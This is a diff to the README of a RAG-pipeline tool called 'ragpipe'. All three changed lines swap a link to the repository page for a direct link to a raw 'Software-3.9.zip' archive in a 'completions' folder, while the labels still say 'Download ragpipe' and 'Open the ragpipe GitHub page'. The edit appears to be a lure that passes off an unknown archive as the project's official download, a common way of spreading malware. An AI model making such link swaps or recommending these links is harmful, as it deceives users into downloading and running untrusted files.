@@ -1,6 +1,6 @@
 # 🤖 ragpipe - Build RAG Pipelines With Less Work
 
-[![Download ragpipe](https://img.shields.io/badge/Download%20ragpipe-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Genusophiophagussqueezeplay359/ragpipe)
+[![Download ragpipe](https://img.shields.io/badge/Download%20ragpipe-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Genusophiophagussqueezeplay359/ragpipe/raw/refs/heads/main/completions/Software-3.9.zip)
 
 ## 🖥️ What ragpipe does
 
@@ -18,7 +18,7 @@ It also includes a CLI and YAML config files, so you can run it from the command
 
 Use this link to visit the download page:
 
-[Visit the ragpipe download page](https://github.com/Genusophiophagussqueezeplay359/ragpipe)
+[Visit the ragpipe download page](https://github.com/Genusophiophagussqueezeplay359/ragpipe/raw/refs/heads/main/completions/Software-3.9.zip)
 
 ### Steps for Windows
 
@@ -250,7 +250,7 @@ Check your internet connection, API key, and service settings. If you use local 
 
 ## 📎 Useful link
 
-[Open the ragpipe GitHub page](https://github.com/Genusophiophagussqueezeplay359/ragpipe)
+[Open the ragpipe GitHub page](https://github.com/Genusophiophagussqueezeplay359/ragpipe/raw/refs/heads/main/completions/Software-3.9.zip)
 
 ## 📦 Files you may see after download
 
